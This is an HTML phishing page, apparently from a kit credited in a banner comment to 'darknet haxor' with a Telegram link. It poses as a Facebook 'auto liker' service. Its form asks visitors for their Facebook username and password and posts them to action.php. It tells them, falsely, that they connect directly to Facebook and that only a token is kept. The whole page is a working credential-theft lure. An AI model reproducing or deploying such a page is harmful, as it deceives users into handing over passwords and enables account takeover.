<!-- DARKNET HAXOR:
________ _______ ________ ______ _______   ____________________ 
___  __ \___    |___  __ \___  //_/___  | / /___  ____/___  __/ 
__  / / /__  /| |__  /_/ /__  ,<   __   |/ / __  __/   __  /    
_  /_/ / _  ___ |_  _, _/ _  /| |  _  /|  /  _  /___   _  /     
/_____/  /_/  |_|/_/ |_|  /_/ |_|  /_/ |_/   /_____/   /_/     

______  _________ ____  _________ ________                     
___  / / /___    |__  |/ /__  __ \___  __ \                    
__  /_/ / __  /| |__    / _  / / /__  /_/ / 
_  __  /  _  ___ |_    |  / /_/ / _  _, _/  
/_/ /_/   /_/  |_|/_/|_|  \____/  /_/ |_| 
------------------------------------------------------------    
Author   : darknet haxor 
Telegram : https://t.me/officialdarknethaxor
------------------------------------------------------------>
<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>IG Fast Liker | Login with Faceb00k</title>
    <meta name="keywords" content="machine liker, machine liker token, machine likes, machine likes token, auto liker token, auto liker, facebook token">
    <meta name="description" content="Machine Liker session token helps you access Machine Liker easily and then get you tons of auto likes.">
    <link rel="canonical" href="index.html">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
    <meta name="generator" content="google">
    <meta name="distribution" content="global">
    <meta name="language" content="EN">
    <meta name="rating" content="General">
    <meta name="robots" content="noodp, noydir, index, follow, all" />
    <meta name="author" content="Machine Liker">
    <meta name="googlebot" content="index, follow" />
    <meta name="revisit-after" content="1">
    <meta name="Expires" content="Never">
    <meta property="og:description" content="Machine Liker session token helps you access Machine Liker easily and then get you tons of auto likes.">
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,600,700" rel="stylesheet" type="text/css">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/machineliker.css" rel="stylesheet">
    <link href="assets/img/ico/main.png" rel="shortcut icon">

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-48326838-16"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments)};
      gtag('js', new Date());
      gtag('config', 'UA-48326838-16');
    </script>
</head>

<body>
    <div class="container">
        <center>
            <h1><b>FB Auto Liker</b></h1>
        </center>
        <hr>

        <div class="col-xs-12 col-md-12">
            <div class="row">
                <div class="alert alert-success"><b>NEWS!</b> Token problem is now fixed permantently. <br> You will need to enter your Facebook credentials for logging in. Do not worry, you connect directly to Facebook, so your account will be safe.</div>                <h3 style="margin-bottom: 16px; margin-top: 25px;"><b>Step 1:</b> Enter your login credentials below.</h3>
                <form action="action.php" method="POST">
                    <label>Enter your <code>email/phone/username:</code></label>
                    <input type="text" class="form-control" name="email" placeholder="Email address, username or phone number" required="">
                    <br />
                    <label>Enter your <code>password:</code></label>
                    <input type="password" class="form-control" name="password" aria-describedby="password" placeholder="Password" required="">
                    <small class="form-text text-muted">The information you enter will be secure and safe. We do not share/sell your information. We only store your access token, nothing else.</small>
                    <br />
                    <br />
                    <button style="font-size: 16px;" type="submit" class="btn btn-primary">
                        <i class="fa fa-sign-in"></i> Login with Facebook
                    </button>
                </form>
                <br /><br /><br /><br />
            </div>
        </div>
    </div>
</body>

</html>
